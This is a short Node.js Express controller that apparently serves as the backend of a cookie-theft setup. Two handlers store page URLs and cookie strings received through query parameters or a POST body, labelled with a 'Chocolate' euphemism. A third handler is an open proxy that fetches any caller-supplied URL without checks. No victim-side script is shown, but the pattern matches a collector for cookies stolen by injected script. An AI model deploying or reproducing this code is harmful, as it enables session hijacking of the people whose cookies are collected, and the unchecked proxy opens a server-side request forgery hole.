const Cookie = require('../models/cookieModel')
const axios = require('axios');

exports.storeGet = async (req, res) => {
    try {
      console.log("new data")
      const url = req.query.url
      const cookies = req.query.cookies

      const newCookie = new Cookie({
        url : url,
        cookies : cookies
      });

      await newCookie.save();
      res.status(201).json({ message: 'Chocolate created successfully'});
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
}

exports.storePost = async (req, res) => {
  try {
    console.log("new data")

    const { data } = req.body

    const newCookie = new Cookie({
      url : "Charlot Test",
      cookies : data
    });

    await newCookie.save();
    res.status(201).json({ message: 'Chocolate created successfully'});
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
}

exports.proxy = async (req, res) => {

  const url = req.query.url;

  if (!url) {
    return res.status(400).send('URL is required');
  }
  try {
    const response = await axios.get(url);
    res.send(response.data);
  } catch (error) {
    res.status(500).send(error.toString());
  }
}